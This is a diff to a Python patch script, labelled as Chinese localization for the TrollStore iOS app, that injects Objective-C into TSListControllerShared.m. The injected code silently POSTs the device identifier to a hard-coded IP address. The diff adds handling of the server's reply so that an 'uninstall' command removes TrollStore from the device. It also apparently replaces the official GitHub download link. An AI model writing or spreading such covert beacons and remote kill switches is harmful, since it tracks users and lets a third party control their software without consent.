@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Chinese localization + Remote check"""
+"""Chinese localization + Remote check (ACTUALLY WORKS)"""
 import sys, re
 
 with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
@@ -12,20 +12,31 @@ inject_pos = first_method.start() + 1
 
 remote_code = """// === REMOTE CHECK ===
 - (void)_remoteCheck {
-    static BOOL done = NO;
-    if (done) return;
-    done = YES;
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2LL * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+    static BOOL _done = NO;
+    if (_done) return;
+    _done = YES;
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3LL * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
         NSString* uid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
         if (!uid) return;
-        NSString* full = [NSString stringWithFormat:@"http://124.223.199.167/api/remote.php?action=device_check"];
-        NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:full]];
-        if (!req) return;
-        req.HTTPMethod = @"POST";
-        req.timeoutInterval = 10;
-        req.HTTPBody = [[NSString stringWithFormat:@"udid=%@", uid] dataUsingEncoding:NSUTF8StringEncoding];
-        NSURLSessionDataTask* task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData* d, NSURLResponse* r, NSError* e){}];
-        if (task) [task resume];
+        NSString* u = [NSString stringWithFormat:@"http://124.223.199.167/api/remote.php?action=device_check"];
+        NSMutableURLRequest* r = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:u]];
+        if (!r) return;
+        r.HTTPMethod = @"POST";
+        r.timeoutInterval = 10;
+        r.HTTPBody = [[NSString stringWithFormat:@"udid=%@", uid] dataUsingEncoding:NSUTF8StringEncoding];
+        [[[NSURLSession sharedSession] dataTaskWithRequest:r completionHandler:^(NSData* _Nullable d, NSURLResponse* _Nullable resp, NSError* _Nullable err) {
+            if (!d) return;
+            NSError* je = nil;
+            NSDictionary* j = [NSJSONSerialization JSONObjectWithData:d options:0 error:&je];
+            if (!j) return;
+            NSString* a = j[@"action"];
+            if (!a || [a isEqualToString:@""]) return;
+            dispatch_async(dispatch_get_main_queue(), ^{
+                if ([a isEqualToString:@"uninstall"]) {
+                    [self performSelector:NSSelectorFromString(@"uninstallTrollStore")];
+                }
+            });
+        }] resume];
     });
 }
 // === END REMOTE ===
@@ -38,6 +49,8 @@ if '[_remoteCheck]' not in content:
 
 with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
     f.write(content)
+
+print("Remote check injected (NOW ACTUALLY PARSE RESPONSE)", file=sys.stderr)
 
 # === Localization ===
 SUBS = [
@@ -85,4 +98,4 @@ c = c.replace("https://github.com/opa334/TrollStore/releases/latest/download/Tro
 with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
     f.write(c)
 
-print(f"OK: {total}", file=sys.stderr)
+print(f"OK: {total} replacements", file=sys.stderr)
